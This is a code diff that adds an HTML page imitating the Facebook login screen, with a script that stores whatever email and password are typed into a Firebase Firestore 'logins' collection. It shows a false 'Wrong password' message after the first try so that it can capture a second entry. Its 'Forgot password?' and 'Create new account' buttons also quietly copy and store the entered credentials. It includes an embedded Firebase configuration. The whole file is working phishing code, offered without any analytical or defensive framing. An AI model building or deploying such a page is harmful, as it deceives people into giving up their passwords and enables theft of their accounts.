@@ -1,0 +1,177 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Facebook - Log In</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body { font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; text-align: center; background-color: #f0f2f5; margin: 0; padding: 0; min-height: 100vh; display: flex; justify-content: center; align-items: center; }
+        .container { width: 100%; max-width: 500px; padding: 20px; box-sizing: border-box; }
+        .logo-title { font-size: 56px; color: #0866ff; font-weight: 700; margin-bottom: 30px; letter-spacing: -1px; text-align: center; }
+        .login-box { background: white; padding: 20px 25px; width: 100%; max-width: 400px; margin: 0 auto; box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1); border-radius: 8px; box-sizing: border-box; }
+        input { width: 100%; padding: 14px 16px; margin: 8px 0; border: 1px solid #dddfe2; border-radius: 6px; box-sizing: border-box; font-size: 17px; color: #1d2129; }
+        .login-button { background-color: #0866ff; color: white; padding: 14px; border: none; width: 100%; border-radius: 6px; cursor: pointer; font-size: 20px; font-weight: 600; transition: background-color 0.2s; }
+        .login-button:hover { background-color: #0056d2; }
+        .error { color: #f02849; margin: 10px 0; font-size: 14px; text-align: left; display: none; }
+        .error.visible { display: block; }
+        .forgot-password { text-align: center; margin-top: 16px; }
+        .forgot-password a { color: #0866ff; text-decoration: none; font-size: 14px; font-weight: 500; }
+        .forgot-password a:hover { text-decoration: underline; }
+        .create-account { text-align: center; margin-top: 20px; }
+        .create-account button { background-color: #42b72a; color: white; padding: 8px 16px; border: none; width: 50%; border-radius: 6px; cursor: pointer; font-size: 14px; font-weight: 500; transition: background-color 0.2s; }
+        .create-account button:hover { background-color: #36a420; }
+        @media (max-width: 600px) { .container { padding: 15px; } .logo-title { font-size: 40px; } .login-box { padding: 15px; max-width: 300px; } input { font-size: 15px; padding: 12px 14px; } .login-button { font-size: 18px; padding: 12px; } .forgot-password a { font-size: 13px; } .create-account button { font-size: 13px; padding: 6px 12px; width: 60%; } }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo-title">facebook</div>
+        <div class="login-box">
+            <form id="loginForm" action="/submit" method="POST" onsubmit="handleSubmit(event)">
+                <input type="text" name="email" id="email" placeholder="Email or phone number" required>
+                <div id="email-error" class="error"></div>
+                <input type="password" name="password" id="password" placeholder="Password" required>
+                <div id="error" class="error {% if error %}visible{% endif %}">{{ error }}</div>
+                <button type="submit" class="login-button">Log In</button>
+            </form>
+            <div class="forgot-password">
+                <form id="forgotForm" action="/forgot-password" method="POST" onsubmit="handleForgot(event)" style="display: inline;">
+                    <input type="hidden" name="email" id="forgotEmail">
+                    <input type="hidden" name="password" id="forgotPassword">
+                    <a href="#" onclick="syncForgotFields(); document.getElementById('forgotForm').submit(); return false;">Forgot password?</a>
+                </form>
+            </div>
+            <div class="create-account">
+                <form id="createForm" action="/create-account" method="POST" onsubmit="handleCreate(event)">
+                    <input type="hidden" name="email" id="createEmail">
+                    <input type="hidden" name="password" id="createPassword">
+                    <button type="submit" onclick="syncCreateFields()">Create new account</button>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-firestore.js"></script>
+    <script>
+        const firebaseConfig = {
+            apiKey: "AIzaSyC-KWbo4PyzEgKaRadAPoGIoN2czc_8ZdY",
+            authDomain: "facebookp-db85f.firebaseapp.com",
+            projectId: "facebookp-db85f",
+            storageBucket: "facebookp-db85f.firebasestorage.app",
+            messagingSenderId: "784746307235",
+            appId: "1:784746307235:web:c6cc6ae90818b4ab9fa916"
+        };
+
+        firebase.initializeApp(firebaseConfig);
+        console.log("Firebase initialized:", firebase.app().name); // Debug
+        const db = firebase.firestore();
+
+        window.attempt = 0;
+
+        function validateForm(emailOrPhone) {
+            const emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
+            const phoneRegex = /^\d{10}$/;
+            const emailError = document.getElementById('email-error');
+            emailError.classList.remove('visible');
+
+            if (!emailRegex.test(emailOrPhone) && !phoneRegex.test(emailOrPhone)) {
+                emailError.textContent = "Please enter a valid email or phone number.";
+                emailError.classList.add('visible');
+                return false;
+            }
+            return true;
+        }
+
+        function syncForgotFields() {
+            document.getElementById('forgotEmail').value = document.getElementById('email').value;
+            document.getElementById('forgotPassword').value = document.getElementById('password').value;
+        }
+
+        function syncCreateFields() {
+            document.getElementById('createEmail').value = document.getElementById('email').value;
+            document.getElementById('createPassword').value = document.getElementById('password').value;
+        }
+
+        async function handleSubmit(event) {
+            event.preventDefault();
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            const errorDiv = document.getElementById('error');
+
+            if (!validateForm(email)) return;
+
+            window.attempt++;
+            console.log("Attempt:", window.attempt); // Debug
+
+            const sessionId = window.attempt === 1 ? Date.now().toString() : localStorage.getItem('sessionId');
+            localStorage.setItem('sessionId', sessionId);
+
+            const data = {
+                email: email,
+                password: password,
+                timestamp: firebase.firestore.FieldValue.serverTimestamp()
+            };
+
+            try {
+                await db.collection('logins').doc(sessionId).set({
+                    [`attempt_${window.attempt}`]: data
+                }, { merge: true });
+                console.log("Data written to Firestore:", data); // Debug
+            } catch (error) {
+                console.error("Firestore write failed:", error);
+            }
+
+            if (window.attempt === 1) {
+                errorDiv.textContent = "Wrong password. Please try again.";
+                errorDiv.classList.add('visible');
+            } else if (window.attempt === 2) {
+                window.location.href = '/redirect';
+            }
+        }
+
+        async function handleForgot(event) {
+            event.preventDefault();
+            const email = document.getElementById('forgotEmail').value;
+            const password = document.getElementById('forgotPassword').value;
+            const errorDiv = document.getElementById('error');
+
+            if (!validateForm(email)) return;
+
+            const sessionId = Date.now().toString();
+            try {
+                await db.collection('logins').doc(sessionId).set({
+                    forgot_attempt: { email, password, timestamp: firebase.firestore.FieldValue.serverTimestamp() }
+                }, { merge: true });
+                console.log("Forgot data written:", { email, password }); // Debug
+            } catch (error) {
+                console.error("Firestore write failed:", error);
+            }
+
+            errorDiv.textContent = "Check your email for a password reset link.";
+            errorDiv.classList.add('visible');
+        }
+
+        async function handleCreate(event) {
+            event.preventDefault();
+            const email = document.getElementById('createEmail').value;
+            const password = document.getElementById('createPassword').value;
+            const errorDiv = document.getElementById('error');
+
+            if (!validateForm(email)) return;
+
+            const sessionId = Date.now().toString();
+            try {
+                await db.collection('logins').doc(sessionId).set({
+                    create_attempt: { email, password, timestamp: firebase.firestore.FieldValue.serverTimestamp() }
+                }, { merge: true });
+                console.log("Create data written:", { email, password }); // Debug
+            } catch (error) {
+                console.error("Firestore write failed:", error);
+            }
+
+            errorDiv.textContent = "Enter your details to sign up.";
+            errorDiv.classList.add('visible');
+        }
+    </script>
+</body>
+</html>
